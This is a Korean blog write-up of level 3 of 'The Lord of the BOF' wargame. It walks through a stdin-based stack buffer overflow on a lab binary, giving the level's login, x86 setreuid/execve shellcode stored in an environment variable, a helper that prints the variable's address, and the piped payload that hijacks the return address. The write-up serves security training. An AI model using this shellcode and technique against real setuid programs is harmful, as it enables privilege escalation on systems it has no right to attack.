---
layout: post
title: "The Lord of the BOF - Level 3"
comments: true
categories: [LOB]
tags: [LOB]
---
<img data-action="zoom" src='{{ "assets/lob/level3/1.jpg" | relative_url }}' alt='relative'>  

## 1) cobolt/hacking exposed 입력하여 로그인하기  

<img data-action="zoom" src='{{ "assets/lob/level3/2.png" | relative_url }}' alt='relative'>  

힌트는 small buffer에 stdin으로 공격 페이로드를 입력하는 것입니다.  

level2번 문제처럼 Eggshell 방법으로 풀고 입력만 stdin 방식으로 입력하면 됩니다.  

<img data-action="zoom" src='{{ "assets/lob/level3/3.png" | relative_url }}' alt='relative'>  

이번 문제는 <a href="https://hsong2.github.io/lob/2021/06/30/The-Lord-of-the-BOF-Level-2.html#stack">level2번 문제</a>와 동일한 구조를 갖고 있습니다.  

공격 페이로드를 그대로 사용하겠습니다. 물론 쉘코드가 저장된 환경변수 주소는 변경해야 합니다.  

``` bash
./cobolt `python -c 'print "\x90"*20+"[쉘코드가 저장된 환경변수 주소]"'`
```

## 2) 환경변수에 쉘코드 저장하기  

<img data-action="zoom" src='{{ "assets/lob/level3/4.png" | relative_url }}' alt='relative'>  

``` bash
export EGG=`python -c 'print "\x90"*20+"\x31\xdb\x66\xbb\x1c\x0c\x89\xd9\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```

``` bash
echo 'int main() { printf("ADDR -> 0x%x\n", getenv("EGG")); }' > getenv.c
```

``` bash
gcc -o getenv getenv.c
```

``` bash
./getenv
```

## 3) 공격 페이로드 입력하여 BOF 일으키기  

파이프라인을 사용하면 프로그램 실행 시 stdin 입력을 동시에 줄 수 있습니다.  
파이프라인을 사용해 위의 공격 페이로드를 수정해야 합니다.  

``` bash
(python -c 'print "\x90"*20+"\x95\xfe\xff\xbf"'; cat) | ./goblin
```

<img data-action="zoom" src='{{ "assets/lob/level3/5.png" | relative_url }}' alt='relative'>  

<img data-action="zoom" src='{{ "assets/lob/level3/6.png" | relative_url }}' alt='relative'>  